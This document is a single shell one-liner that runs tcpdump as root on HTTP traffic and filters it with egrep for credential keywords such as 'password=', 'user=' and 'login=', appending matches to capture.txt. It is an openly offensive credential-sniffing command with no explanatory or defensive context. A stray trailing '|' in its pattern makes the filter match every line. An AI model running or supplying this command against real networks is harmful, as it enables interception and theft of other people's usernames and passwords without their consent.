sudo tcpdump port http or host anything.com|egrep -i 'pwd=|password=|passwd=|pass=|user=|login=|user=|username=|pw=|passw=|passwd|pass:|user:|username:|password:|login:|pass |' >> capture.txt
